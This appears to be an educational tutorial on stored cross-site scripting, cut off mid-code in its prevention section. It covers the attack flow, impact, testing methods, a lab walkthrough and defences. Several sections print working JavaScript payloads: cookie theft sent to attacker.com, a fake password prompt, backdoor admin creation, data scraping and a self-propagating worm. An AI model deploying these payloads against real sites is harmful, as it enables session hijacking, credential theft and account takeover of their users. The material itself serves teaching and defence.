# Stored XSS

Stored cross-site scripting (also known as persistent XSS or second-order XSS) is a web security vulnerability where an application accepts data from an untrusted source, stores it in a database or file system, and later includes that data in HTTP responses to users without proper encoding or sanitization. Unlike reflected XSS which requires victims to click malicious links, stored XSS payloads persist on the server and automatically execute for every user who views the affected page, making it significantly more dangerous and impactful. When an attacker successfully injects malicious JavaScript into a vulnerable input field like a comment form, profile bio, or message board post, the payload is saved to the application's backend storage and subsequently served to all visitors who access that content. This creates a self-contained attack that requires no external delivery mechanism—the attacker simply submits the payload once and waits for victims to encounter it naturally while using the application. Because stored XSS affects multiple users automatically and persists across sessions, it has higher severity than reflected XSS and can lead to widespread compromise, data breaches, session hijacking at scale, account takeover campaigns, and even self-propagating XSS worms.

The fundamental vulnerability: **applications store untrusted user input and later display it without encoding**—what gets saved as data becomes executable code when rendered to users.

## What is Stored XSS?

### Understanding stored XSS

**Definition:** A persistent cross-site scripting vulnerability where malicious JavaScript is stored on the target server (database, files, cache) and automatically executed in the browsers of all users who view the affected content.

**Key characteristics:**
- Persistent (survives server restarts)
- Self-contained (no external delivery needed)
- Automatic execution (affects all viewers)
- Higher severity than reflected XSS
- Potential for mass compromise
- Worm propagation possible

**Also known as:**
- Persistent XSS
- Second-order XSS (when stored in one location, displayed in another)
- Type-II XSS

### Attack lifecycle

**Complete stored XSS attack flow:**

```
Phase 1: Injection
┌─────────────────────────────────────────┐
│ Attacker submits malicious payload      │
│ Via: Comment form, profile update, etc. │
│ Payload: <script>steal_cookie()</script>│
└─────────────────┬───────────────────────┘
                  ↓
Phase 2: Storage
┌─────────────────────────────────────────┐
│ Application stores payload in database  │
│ No validation or encoding applied       │
│ Payload persists on server              │
└─────────────────┬───────────────────────┘
                  ↓
Phase 3: Retrieval
┌─────────────────────────────────────────┐
│ Legitimate user visits page             │
│ Application queries database             │
│ Retrieves stored payload                │
└─────────────────┬───────────────────────┘
                  ↓
Phase 4: Delivery
┌─────────────────────────────────────────┐
│ Server includes payload in HTML response│
│ No encoding applied on output           │
│ Sends to user's browser                 │
└─────────────────┬───────────────────────┘
                  ↓
Phase 5: Execution
┌─────────────────────────────────────────┐
│ Victim's browser parses HTML            │
│ Executes malicious JavaScript           │
│ Runs with application's origin          │
│ Has access to victim's session          │
└─────────────────┬───────────────────────┘
                  ↓
Phase 6: Compromise
┌─────────────────────────────────────────┐
│ Attacker achieves objectives:           │
│ • Steal session cookies                 │
│ • Capture credentials                   │
│ • Perform actions as victim             │
│ • Exfiltrate sensitive data             │
└─────────────────────────────────────────┘
```

### Simple stored XSS example

**Vulnerable blog comment system:**

**Backend code (PHP):**
```php
<?php
// Store comment - VULNERABLE: No encoding
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $comment = $_POST['comment'];
    $name = $_POST['name'];
    $postId = $_POST['postId'];
    
    // Store directly in database without sanitization
    $sql = "INSERT INTO comments (post_id, name, comment) VALUES (?, ?, ?)";
    $stmt = $db->prepare($sql);
    $stmt->execute([$postId, $name, $comment]);
}

// Display comments - VULNERABLE: No encoding
$comments = $db->query("SELECT * FROM comments WHERE post_id = $postId");

foreach ($comments as $comment) {
    // Direct output without encoding
    echo "<div class='comment'>";
    echo "<strong>" . $comment['name'] . "</strong>";
    echo "<p>" . $comment['comment'] . "</p>";
    echo "</div>";
}
?>
```

**Normal usage:**
```http
POST /post/comment HTTP/1.1
Host: vulnerable-blog.com
Content-Type: application/x-www-form-urlencoded

postId=3&comment=Great article!&name=Alice

Stored in database:
| id | post_id | name  | comment        |
|----|---------|-------|----------------|
| 1  | 3       | Alice | Great article! |

Displayed to all users:
<div class='comment'>
    <strong>Alice</strong>
    <p>Great article!</p>
</div>
```

**Malicious usage:**
```http
POST /post/comment HTTP/1.1
Host: vulnerable-blog.com
Content-Type: application/x-www-form-urlencoded

postId=3&comment=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>&name=Hacker

URL-encoded payload:
comment=%3Cscript%3Efetch%28%27https%3A%2F%2Fattacker.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E

Stored in database:
| id | post_id | name   | comment                                    |
|----|---------|--------|--------------------------------------------|
| 2  | 3       | Hacker | <script>fetch('https://att...')</script>   |

Displayed to ALL users viewing this post:
<div class='comment'>
    <strong>Hacker</strong>
    <p><script>fetch('https://attacker.com/steal?c='+document.cookie)</script></p>
</div>

Every visitor's browser:
✗ Parses the script tag
✗ Executes the fetch call
✗ Sends their cookie to attacker.com
✗ Session hijacked automatically
```

### Stored vs. Reflected XSS

**Critical differences:**

| Aspect | Stored XSS | Reflected XSS |
|--------|------------|---------------|
| **Storage** | Persistent in database/filesystem | Not stored, travels in request |
| **Delivery mechanism** | Self-contained (stored on server) | External (malicious link) |
| **Social engineering** | Not required | Required to deliver link |
| **Victim action** | Just visit page (normal behavior) | Must click malicious link |
| **Attack scope** | All users viewing content | Individual victims clicking link |
| **Timing** | Works whenever victim visits | Must time when victim logged in |
| **Severity** | Higher (mass compromise) | Lower (individual compromise) |
| **Exploitability** | Easier (automatic trigger) | Harder (needs link delivery) |
| **Detection** | Harder (in database) | Easier (visible in URL) |
| **Persistence** | Survives restarts | Gone after response |

**Stored XSS advantages for attackers:**

```
✓ No social engineering needed
✓ Automatic execution for all users
✓ Guaranteed victim is authenticated (viewing page requires login)
✓ Persistent until removed
✓ Can target administrators (who view all content)
✓ Potential for worm-like propagation
✓ Higher credibility (appears on legitimate site)
✓ Affects users even if security-conscious
```

**Reflected XSS limitations:**

```
✗ Requires convincing victim to click link
✗ Victim might notice suspicious URL
✗ Only affects users who click link
✗ Timing issues (victim might not be logged in)
✗ One-time execution per click
✗ Easier to detect and avoid
```

### Self-contained nature of stored XSS

**Why stored XSS is more dangerous:**

**Scenario: Forum application with stored XSS in signatures**

```
Traditional reflected XSS attack:
1. Attacker crafts malicious URL
2. Attacker sends URL to 100 targets via email
3. 5 targets click link (5% click rate)
4. 5 users compromised
5. Attack visible in URL (security tools might warn)

Stored XSS attack:
1. Attacker posts payload in forum signature once
2. Attacker posts innocent-looking forum reply
3. 1000 users view the thread naturally
4. 1000 users compromised automatically
5. No suspicious URL, appears as normal forum content
6. Persists until admin removes it
7. New users continue to be compromised

Impact comparison:
Reflected: 5 compromised users
Stored: 1000+ compromised users with single injection
```

**Guaranteed authentication advantage:**

```
Reflected XSS timing problem:
User receives malicious link → Clicks 2 hours later → Might be logged out
Result: XSS executes but session invalid, limited impact

Stored XSS advantage:
User visits page → Must be logged in to access content → Guaranteed valid session
Result: XSS always executes with valid authentication, maximum impact
```

## Impact of Stored XSS

### Complete user compromise

**All reflected XSS impacts apply, plus:**

**1. Mass session hijacking:**
```html
<script>
// Posted in forum signature - affects everyone reading threads
fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify({
        cookie: document.cookie,
        username: document.querySelector('.username')?.textContent,
        url: location.href,
        timestamp: new Date().toISOString()
    })
});
</script>

Attack scope:
- Attacker posts in popular forum thread
- 5000 users view thread over 1 week
- 5000 session cookies collected
- Attacker can impersonate any of these users
- Can access accounts, steal data, perform actions
```

**2. Credential harvesting at scale:**
```html
<script>
// Injected in profile bio viewed by many users
document.body.innerHTML = `
    <div style="position:fixed; top:0; left:0; width:100%; height:100%; 
                background:rgba(0,0,0,0.9); z-index:999999; 
                display:flex; justify-content:center; align-items:center;">
        <div style="background:white; padding:40px; border-radius:8px;">
            <h2>Session Expired</h2>
            <p>Please re-enter your password to continue</p>
            <form id="phish">
                <input type="password" placeholder="Password" required>
                <button type="submit">Continue</button>
            </form>
        </div>
    </div>
`;

document.getElementById('phish').onsubmit = function(e) {
    e.preventDefault();
    const pass = this.querySelector('input').value;
    
    fetch('https://attacker.com/passwords', {
        method: 'POST',
        body: JSON.stringify({
            user: document.querySelector('.current-user').textContent,
            password: pass,
            site: location.hostname
        })
    });
    
    alert('Verification failed. Please contact support.');
    location.reload();
};
</script>

Impact:
- Every user viewing this profile sees fake login
- Hundreds/thousands of passwords captured
- Can be used for account takeover
- Credential stuffing attacks on other services
```

**3. Administrative account compromise:**
```html
<script>
// Posted in support ticket viewed by admin
if (document.querySelector('.admin-panel')) {
    // User is admin, create backdoor account
    fetch('/admin/api/users/create', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            username: 'system_backup',
            password: 'P@ssw0rd123!',
            email: 'backup@internal.local',
            role: 'administrator',
            hidden: true
        })
    }).then(response => response.json())
      .then(data => {
          // Exfiltrate admin's session and new account details
          fetch('https://attacker.com/admin-pwned', {
              method: 'POST',
              body: JSON.stringify({
                  admin_cookie: document.cookie,
                  new_account: data,
                  timestamp: Date.now()
              })
          });
      });
}
</script>

Result:
- Admin views support ticket with payload
- Backdoor admin account created
- Attacker has permanent admin access
- Complete application compromise
```

**4. Widespread data exfiltration:**
```html
<script>
// In product review, viewed by all shoppers
const sensitiveData = {
    // Scrape all visible customer data
    orders: Array.from(document.querySelectorAll('.order')).map(o => ({
        id: o.querySelector('.order-id')?.textContent,
        total: o.querySelector('.total')?.textContent,
        items: o.querySelector('.items')?.textContent
    })),
    
    // Payment info if visible
    cards: Array.from(document.querySelectorAll('.payment-method')).map(c => ({
        last4: c.querySelector('.card-number')?.textContent,
        type: c.querySelector('.card-type')?.textContent
    })),
    
    // Personal info
    profile: {
        name: document.querySelector('.customer-name')?.textContent,
        email: document.querySelector('.customer-email')?.textContent,
        address: document.querySelector('.address')?.textContent
    }
};

// Send to attacker
fetch('https://attacker.com/exfiltrate', {
    method: 'POST',
    body: JSON.stringify(sensitiveData)
});
</script>

Scale:
- Every customer viewing product sees malicious review
- Thousands of accounts compromised
- Personal and financial data stolen
- Potential for identity theft, fraud
```

### Stored XSS worms

**Self-propagating XSS (inspired by Samy worm):**

```javascript
// Historical concept - demonstrates stored XSS propagation potential

<script>
// Posted in user's profile "About Me" section
(function() {
    // 1. Get current user's ID
    const currentUserId = document.querySelector('[data-user-id]').dataset.userId;
    
    // 2. Read the worm code (this script itself)
    const wormCode = document.querySelector('.profile-about').innerHTML;
    
    // 3. Add attacker as friend (social network context)
    fetch('/api/friends/add', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({friendId: 'ATTACKER_ID'})
    });
    
    // 4. Update current user's profile with worm code (propagate)
    fetch('/api/profile/update', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            about: wormCode,  // Include worm in victim's profile
            signature: wormCode  // Multiple infection vectors
        })
    });
    
    // 5. Exfiltrate data
    fetch('https://attacker.com/worm-spread', {
        method: 'POST',
        body: JSON.stringify({
            infected_user: currentUserId,
            cookie: document.cookie,
            timestamp: Date.now()
        })
    });
})();
</script>

Propagation pattern:
Initial infection: Attacker's profile contains worm
    ↓
User A visits attacker's profile
    ↓
User A's profile infected with worm, attacker added as friend
    ↓
User B visits User A's profile
    ↓
User B's profile infected with worm, attacker added as friend
    ↓
User C visits User B's profile
    ↓
[Exponential spread across entire platform]

Samy worm (2005 - MySpace):
- Infected over 1 million profiles in 24 hours
- Made attacker everyone's friend
- Propagated via profile views (stored XSS)
- One of the fastest spreading worms in history
```

### Real-world stored XSS impact

**Case study: E-commerce admin panel compromise**

```
Vulnerability: Stored XSS in product review system

Attack sequence:

Day 1:
- Attacker submits malicious product review
- Payload: <script src="https://attacker.com/admin-hook.js"></script>
- Review stored in database
- Appears on product page (viewed by customers)
- Appears in admin review moderation panel

Day 2:
- Admin logs in to moderate reviews
- Views list of pending reviews
- Malicious payload executes in admin's browser
- admin-hook.js script runs with admin privileges

admin-hook.js behavior:
1. Enumerates all users (admin API access)
2. Exfiltrates customer database (emails, addresses, order history)
3. Creates backdoor admin account
4. Modifies product prices to $0.01
5. Updates product descriptions with phishing links
6. Sends admin's session cookie to attacker

Impact:
- 50,000 customer records stolen
- Data breach notification required
- Financial loss from $0.01 products ordered
- Reputation damage
- Regulatory fines (GDPR/PCI-DSS violations)
- Legal liability
- Estimated total cost: $2.5 million
```

## Common Stored XSS Locations

### User-generated content areas

**High-value targets for stored XSS:**

**1. Comment systems:**
```
Blog comments
Product reviews
Forum posts and replies
Article feedback
Discussion threads
News comments
```

**Example vulnerability:**
```html
<!-- Comment display - vulnerable -->
<div class="comment">
    <p><?php echo $comment['text']; ?></p>
</div>

Attack:
Comment: <img src=x onerror=alert(1)>
Result: Executes for all post viewers
```

**2. User profiles:**
```
Biography/About me sections
Profile descriptions
Status messages
Personal websites/links
Signature lines
Location fields
Job titles
```

**Example vulnerability:**
```python
# Profile display - vulnerable
@app.route('/profile/<username>')
def show_profile(username):
    user = User.query.filter_by(username=username).first()
    return f'''
        <h1>{user.username}</h1>
        <p>{user.bio}</p>
        <p>Location: {user.location}</p>
    '''

Attack:
bio = '<script>steal_session()</script>'
Result: Executes for all profile visitors
```

**3. Messaging systems:**
```
Private messages
Chat messages
Email bodies (webmail)
Notification messages
Direct messages
Group chat
```

**4. Social features:**
```
Status updates
Wall posts
Activity feed items
Shared content
Photo captions
Video descriptions
```

### Less obvious but equally dangerous

**5. Admin-only views:**
```
User activity logs
Error logs (if display user input)
Moderation queues
Support ticket systems
Analytics dashboards
Audit trails
```

**Why dangerous:**
```
Admins see all content
Compromise admin = full application access
Often less cautious (trusted internal system)
Can create backdoor accounts
Access to sensitive configurations
```

**Example:**
```javascript
// Support ticket system - vulnerable
app.get('/admin/tickets', requireAdmin, async (req, res) => {
    const tickets = await Ticket.find().limit(50);
    
    let html = '<h1>Support Tickets</h1>';
    tickets.forEach(ticket => {
        // VULNERABLE: No encoding
        html += `
            <div class="ticket">
                <h3>${ticket.subject}</h3>
                <p>${ticket.description}</p>
                <p>From: ${ticket.userEmail}</p>
            </div>
        `;
    });
    
    res.send(html);
});

Attack:
User submits ticket with subject:
"<script>createBackdoorAdmin()</script>"

Result:
Admin views ticket queue → Script executes → Backdoor created
```

**6. File metadata:**
```
Uploaded file names
Image EXIF data (if displayed)
Document properties
PDF metadata
```

**Example:**
```php
<?php
// File upload display - vulnerable
$fileName = $_FILES['upload']['name'];
move_uploaded_file($_FILES['upload']['tmp_name'], 'uploads/' . $fileName);

echo "<p>File uploaded: $fileName</p>";
?>

Attack:
Upload file named: <script>alert(1)</script>.jpg
Result: XSS when file list displayed
```

**7. Configuration settings:**
```
Application settings (if displayed to users)
Email templates
Custom page content
Banner messages
Announcement text
```

**8. Third-party data sources:**
```
Social media feeds (if displaying tweets, posts)
RSS feed content
Email received via SMTP (webmail apps)
API responses from external services
Network monitoring data
```

**Example:**
```javascript
// Display Twitter feed - vulnerable
app.get('/feed', async (req, res) => {
    const tweets = await fetchTwitterFeed('@company');
    
    let html = '<div class="tweets">';
    tweets.forEach(tweet => {
        // Trusts Twitter content without encoding
        html += `<p>${tweet.text}</p>`;
    });
    html += '</div>';
    
    res.send(html);
});

Attack vector:
1. Attacker tweets malicious payload tagging @company
2. Company's website fetches and displays tweet
3. All website visitors see attacker's tweet
4. XSS executes on company's domain
```

## Finding and Testing for Stored XSS

### Understanding entry and exit points

**Entry points (where attacker can input data):**

```
Direct HTTP parameters:
✓ Form fields (POST data)
✓ URL query parameters
✓ JSON API payloads
✓ XML data
✓ File uploads (name, content, metadata)

HTTP headers:
✓ User-Agent
✓ Referer
✓ Cookie values
✓ Custom headers (X-Forwarded-For, etc.)

Out-of-band sources:
✓ Email messages (webmail applications)
✓ Social media posts (if aggregated)
✓ RSS feeds
✓ Third-party API data
✓ Network traffic data
✓ Log files
```

**Exit points (where stored data is displayed):**

```
User-facing pages:
✓ Profile pages
✓ Comment sections
✓ Search results
✓ Product listings
✓ Message inboxes
✓ Notification centers
✓ Dashboard widgets

Administrative interfaces:
✓ User management panels
✓ Content moderation queues
✓ Analytics dashboards
✓ Log viewers
✓ Support ticket systems

Generated content:
✓ PDF reports
✓ Email notifications
✓ RSS feeds
✓ API responses
✓ Exported data files

Other users' views:
✓ Public profiles
✓ Shared documents
✓ Collaborative workspaces
```

### Testing methodology

**Step 1: Map entry-to-exit point links**

**Systematic approach:**

```
Create tracking matrix:

Entry Point          → Exit Point(s)              → Time Delay
─────────────────────────────────────────────────────────────
Profile bio field    → Own profile page           → Immediate
                     → Search results              → Immediate
                     → Admin user list             → Immediate
                     → Other users' friend list    → Immediate

Blog comment field   → Article page               → After approval
                     → Recent comments widget      → After approval
                     → Author's dashboard          → Immediate
                     → Admin moderation queue      → Immediate

Product review       → Product page               → 24hr delay
                     → User's review history       → Immediate
                     → Search results              → 24hr delay
                     → Email to product owner      → Immediate

Support ticket       → Ticket view page           → Immediate
                     → Admin queue                 → Immediate
                     → Email notification          → Immediate
```

**Why mapping is challenging:**

```
1. Data can appear in unexpected places
Example: Username appears in:
- Profile page ✓ (obvious)
- Comment headers ✓ (obvious)
- Admin logs ✗ (unexpected)
- Email footers ✗ (unexpected)
- PDF reports ✗ (unexpected)

2. Time delays
- Some content requires approval
- Data may be cached
- Background processing
- Scheduled report generation

3. Permission-based visibility
- Some exit points only visible to:
  → Admins
  → Premium users
  → Content owners
  → Specific user roles
```

**Step 2: Submit unique identifiable payloads**

**Payload strategy:**

```javascript
// Create unique identifiers per input field

Format: xss_[LOCATION]_[RANDOM]_[CONTEXT]

Examples:
Profile bio:        xss_bio_h8g2k9_html<script>alert('bio')</script>
Comment field:      xss_comment_p3x7m1_html<script>alert('comment')</script>
Product review:     xss_review_r4j9s2_html<script>alert('review')</script>
Username:           xss_user_k2m8n5_html<img src=x onerror=alert('user')>
Email field:        xss_email_j7p3q1_attr"><<script>alert('email')</script>

Why this format:
✓ xss_ prefix: Easy to search for
✓ Location identifier: Track which input
✓ Random string: Prevent collisions
✓ Context hint: Remember intended context
✓ Unique alert message: Identify which payload fired
```

**Submission example:**

```http
POST /profile/update HTTP/1.1
Host: target-site.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=user_session_token

bio=xss_bio_h8g2k9<script>alert('bio_stored_xss')</script>&
location=xss_loc_p3x7m1<img src=x onerror=alert('location')>&
website=xss_web_r4j9s2" onclick="alert('website')
```

**Step 3: Navigate application to find where data appears**

**Comprehensive search checklist:**

```
Immediate checks:
□ Submission confirmation page
□ User's own profile/settings page
□ Public-facing profile
□ Recent activity feed

Broader application search:
□ Homepage (if content featured)
□ Search results (search for username)
□ Category/tag pages
□ Notification area
□ Activity logs

Other user perspectives:
□ Log in as different user
□ View public pages as anonymous
□ Check friend/follower views
□ Review collaborative areas

Administrative views:
□ Admin panel (if accessible)
□ Moderation queues
□ User management interfaces
□ Analytics/reporting sections

Indirect outputs:
□ Email notifications
□ RSS feeds
□ API endpoint responses
□ Exported data (CSV, PDF)
□ Mobile app (if exists)

Browser search technique:
1. Open DevTools (F12)
2. Network tab → Clear
3. Navigate to suspected page
4. Ctrl+F in Network responses
5. Search for: xss_bio_h8g2k9
6. Check every match
```

**Step 4: Verify persistence and scope**

**Persistence testing:**

```
Test 1: Logout and login
1. Submit payload
2. Logout completely
3. Log back in
4. Navigate to exit point
5. Check if payload still there
✓ Confirms data is stored, not session-based

Test 2: Different browser
1. Submit payload in Browser A
2. Open Browser B (different session)
3. Navigate to exit point
4. Check if payload appears
✓ Confirms server-side storage, not client-side

Test 3: Time delay
1. Submit payload
2. Wait 24 hours
3. Check exit point
✓ Confirms persistent storage

Test 4: Server restart (if you control environment)
1. Submit payload
2. Restart application/database
3. Check exit point
✓ Confirms database persistence
```

**Scope testing:**

```
Test who sees the payload:

Scenario 1: Public comments
- Submit payload as User A
- View as User B (different account)
- View as anonymous (logged out)
- View as Admin
Result: If all see payload → Wide scope

Scenario 2: Private messages
- Send payload to User B
- Check if visible to User C
- Check admin view
Result: Determines isolation/leakage

Scope documentation:
Entry: Comment on post #123
Exit: 
  ✓ Post page (all users)
  ✓ Recent comments widget (all users)
  ✓ RSS feed (all subscribers)
  ✗ Other posts (isolated)
  ✓ Admin moderation (admin only)
Scope: Wide (public) + Admin access
```

**Step 5: Test context-appropriate payloads**

**Context determination:**

```html
Found payload location: <div>xss_bio_h8g2k9</div>
Context: HTML element
Payloads to test:
1. <script>alert(1)</script>
2. <img src=x onerror=alert(1)>
3. <svg onload=alert(1)>

Found payload location: <input value="xss_bio_h8g2k9">
Context: Quoted attribute
Payloads to test:
1. "><script>alert(1)</script>
2. " autofocus onfocus=alert(1) x="
3. " onmouseover=alert(1)

Found payload location: <script>var bio="xss_bio_h8g2k9";</script>
Context: JavaScript string
Payloads to test:
1. ";alert(1);//
2. </script><script>alert(1)</script><script>
3. \";alert(1);//
```

**Advanced testing considerations:**

```
Character encoding:
- Try UTF-8 encoded payloads
- Test double encoding
- Unicode variations

Case sensitivity:
- <ScRiPt>alert(1)</ScRiPt>
- Different case combinations

Mutation XSS:
- Browser parsing quirks
- Invalid HTML causing mutations
- <noscript><p title="</noscript><img src=x onerror=alert(1)>">

Length limitations:
- Test maximum field length
- Try shorter payloads if truncated
- <script>eval(name)</script> + Set window.name

Content type:
- If JSON endpoint, test: {"comment":"<svg onload=alert(1)>"}
- If XML, test CDATA sections
```

### Automated testing with Burp Suite

**Burp Scanner workflow:**

```
Active scanning for stored XSS:

1. Browse application normally with Burp proxy on
2. Burp maps application (entry/exit points)
3. Right-click any request → "Scan" → "Audit selected items"
4. Or: Dashboard → "New scan" → Configure target
5. Burp automatically:
   - Submits payloads to all inputs
   - Navigates application
   - Monitors responses for payload reflection
   - Tests context-appropriate exploitation
   - Verifies JavaScript execution
   - Reports confirmed vulnerabilities

Review findings:
- Target → Issue activity
- Filter by: "Cross-site scripting (stored)"
- Each issue includes:
  → Entry point
  → Exit point(s)
  → Payload used
  → Response showing execution
  → Remediation advice
```

**Burp Collaborator for blind stored XSS:**

```javascript
// Useful when you can't see where data appears

Payload using Burp Collaborator:
<script src="https://BURP_COLLABORATOR_SUBDOMAIN"></script>

Or:
<img src="https://BURP_COLLABORATOR_SUBDOMAIN/xss">

Workflow:
1. Burp generates unique subdomain: abc123.burpcollaborator.net
2. Submit payload with this subdomain
3. Burp Collaborator server receives DNS/HTTP requests
4. Confirms payload executed somewhere
5. Investigate to find exit point

Benefits:
✓ Detects stored XSS even when exit point unknown
✓ Finds delayed execution
✓ Discovers admin-only pages you can't access
✓ No need to manually search application
```

### Manual testing challenges

**Challenge 1: Approval workflows**

```
Problem:
- Submit comment with payload
- Goes to moderation queue
- Can't see if stored until approved
- Admin might reject malicious-looking content

Solutions:
- Use subtle payloads: <img src=x onerror=alert(1)>
- Encode payload: &lt;script&gt; won't look malicious in queue
- Hide in legitimate content: "Great article! <script>...</script>"
- Test with normal account, approve with admin account (if you control both)
```

**Challenge 2: Data overwritten**

```
Problem:
Recent searches widget shows last 5 searches
Your test payload appears, but then disappears when others search

Solution:
- Document quickly when payload appears
- Take screenshots immediately
- Test during off-peak hours
- Use multiple accounts to submit payloads
- Verify persistent storage vs. temporary display
```

**Challenge 3: Hidden admin panels**

```
Problem:
Payload stored but you can't access admin view where it's displayed

Solutions:
- Use Burp Collaborator (detects blind XSS)
- Social engineering: Report "bug" causing admin to check
- Privilege escalation: Find way to access admin area
- Blind payload: <script src="//yourserver/log?admin=true"></script>
- Monitor your server logs for requests
```

## Lab Walkthrough: Stored XSS into HTML Context

**Scenario:** Blog with comment system, no encoding

**Objective:** Inject stored XSS that triggers alert when anyone views the blog post

**Step 1: Explore the application**

```
Navigate to blog post:
URL: https://lab-id.web-security-academy.net/post?postId=3

Observe:
- Blog post content
- Comment section below
- Comment form with fields:
  → Comment textarea
  → Name field
  → Email field
  → "Post Comment" button
```

**Step 2: Test normal comment submission**

```http
POST /post/comment HTTP/1.1
Host: lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

postId=3&comment=Test+comment&name=TestUser&email=test@test.com

Response:
HTTP/1.1 302 Found
Location: /post?postId=3

Follow redirect:
GET /post?postId=3

Page now shows:
<div class="comment">
    <p>TestUser | test@test.com</p>
    <p>Test comment</p>
</div>

Comment successfully stored and displayed!
```

**Step 3: Identify injection context**

```html
View page source:
<div class="comment">
    <p>TestUser | test@test.com</p>
    <p>Test comment</p>
</div>

Context analysis:
- Comment appears between <p> tags
- No visible encoding
- HTML element context
- Standard <script> tag should work
```

**Step 4: Inject XSS payload**

```http
POST /post/comment HTTP/1.1
Host: lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

postId=3&comment=<script>alert(1)</script>&name=Attacker&email=bad@test.com

URL-encoded:
postId=3&comment=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&name=Attacker&email=bad%40test.com

Response:
HTTP/1.1 302 Found
Location: /post?postId=3
```

**Step 5: Verify exploitation**

```
Navigate to: https://lab-id.web-security-academy.net/post?postId=3

Page source:
<div class="comment">
    <p>Attacker | bad@test.com</p>
    <p><script>alert(1)</script></p>
</div>

Result:
✓ Alert dialog appears
✓ JavaScript executed
✓ Stored XSS confirmed

Lab status:
✓ Congratulations, you solved the lab!
```

**Step 6: Verify persistence**

```
Test 1: Refresh page
- Alert fires again
✓ Payload persists across page loads

Test 2: Open in incognito window
- Navigate to same URL
- Alert fires
✓ Affects all users (not session-based)

Test 3: View from different account
- Login as different user
- Navigate to post
- Alert fires
✓ Confirmed stored XSS affecting all visitors
```

**Real-world exploitation:**

```javascript
// Instead of alert(1), attacker would use:
<script>
// Steal all visitors' cookies
fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify({
        cookie: document.cookie,
        url: location.href,
        victim: document.querySelector('.username')?.textContent
    })
});
</script>

Impact:
- Every visitor to this blog post compromised
- Sessions hijacked automatically
- No user interaction required
- Persists until admin removes comment
```

## Prevention Strategies

### Primary defense: Output encoding

**Context-aware encoding is essential:**

**HTML context encoding:**

```php
<?php
// SECURE: Encode for HTML context
$comment = htmlspecialchars($_POST['comment'], ENT_QUOTES | ENT_HTML5, 'UTF-8');

// Store in database
$db->query("INSERT INTO comments (text) VALUES (?)", [$comment]);

// Display (already encoded)
foreach ($comments as $comment) {
    echo "<p>" . $comment['text'] . "</p>";
}

// Alternative: Encode on output
$db->query("INSERT INTO comments (text) VALUES (?)", [$_POST['comment']]);

foreach ($comments as $comment) {
    echo "<p>" . htmlspecialchars($comment['text'], ENT_QUOTES | ENT_HTML5, 'UTF-8') . "</p>";
}
?>
```

**JavaScript context encoding:**

```javascript
function escapeJavaScript(str) {
    return str
        .replace(/\\/g, '\\\\')
        .replace(/'/g, "\\'")
        .replace(/"/g, '\\"')
        .replace(/\n/g, '\\n')
        .replace(/\r/g, '\\r')
        .replace(/</g, '\\x3c')
        .replace(/>/g, '\\x3e');
}

// Store user bio
const bio = req.body.bio;
await db.users.update({id: userId}, {bio: bio});

// Display in JavaScript context
const user = await db.users.findOne({id: userId});
res.send(`
    <script>
        var userBio = '${escapeJavaScript(user.bio)}';
        displayBio(userBio);
    </script>
`);
```

**Best practice: Encode on output, not input**

```
Why encode on output:
✓ Preserves original data
✓ Can be displayed in multiple contexts (HTML, JS, PDF)
✓ Easier to fix if encoding missed
✓ Data remains searchable in database
✗ Encoding on input makes data unusable elsewhere

Example:
Stored: <script>alert(1)</script>
Output to HTML: &lt;script&gt;alert(1)&lt;/script&gt;
Output to PDF: <script>alert(1)</script> (different context, different encoding)
Output to JSON API: {"comment":"<script>alert(1)</script>"} (escaped in JSON)
```

### Secondary defense: Input validation

**Allowlist validation:**

```python
import re

def validate_comment(comment):
    """Validate comment input"""
    
    # Length check
    if len(comment) > 1000:
        raise ValueError("Comment too long")
    
    # Character allowlist (adjust based on requirements)
    # Allow letters, numbers, common punctuation, newlines
    pattern = r'^[a-zA-Z0-9\s.,!?\'"-\n\r]+$'
    
    if not re.match(pattern, comment):
        raise ValueError("Comment contains invalid characters")
    
    return comment

# Usage
try:
    comment = validate_comment(request.form['comment'])
    db.comments.insert({'text': comment})
except ValueError as e:
    return "Invalid comment", 400
```

**Content sanitization (use with caution):**

```javascript
// Use DOMPurify or similar library
const DOMPurify = require('isomorphic-dompurify');

// Allow only safe HTML tags
const clean = DOMPurify.sanitize(userInput, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
    ALLOWED_ATTR: []
});

// Store sanitized content
await db.comments.insert({text: clean});

// Warning: Sanitization is complex and error-prone
// Prefer encoding over sanitization
```

### Tertiary defense: Content Security Policy

**Implement strict CSP:**

```javascript
app.use((req, res, next) => {
    const nonce = crypto.randomBytes(16).toString('base64');
    res.locals.nonce = nonce;
    
    res.setHeader(
        'Content-Security-Policy',
        `default-src 'self'; ` +
        `script-src 'nonce-${nonce}' 'strict-dynamic'; ` +
        `object-src 'none'; ` +
        `base-uri 'none';`
    );
    
    next();
});

// Even if stored XSS exists, CSP blocks execution:
// <script>alert(1)</script> ← Blocked (no nonce)
// <script nonce="${nonce}">...</script> ← Allowed
```

### Complete secure implementation

**Full stack protection:**

```javascript
const express = require('express');
const helmet = require('helmet');
const crypto = require('crypto');
const db = require('./database');

const app = express();
app.use(express.urlencoded({extended: true}));
app.use(express.json());

// 1. Security headers
app.use(helmet());

// 2. CSP
app.use((req, res, next) => {
    res.locals.nonce = crypto.randomBytes(16).toString('base64');
    res.setHeader(
        'Content-Security-Policy',
        `default-src 'self'; script-src 'nonce-${res.locals.nonce}'; object-src 'none';`
    );
    next();
});

// 3. Input validation
function validateComment(comment) {
    if (!comment || typeof comment !== 'string') {
        throw new Error('Invalid comment');
    }
    
    if (comment.length > 1000) {
        throw new Error('Comment too long');
    }
    
    // Basic character check
    const pattern = /^[a-zA-Z0-9\s.,!?'"-\n\r]+$/;
    if (!pattern.test(comment)) {
        throw new Error('Comment contains invalid characters');
    }
    
    return comment;
}

// 4. HTML encoding
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
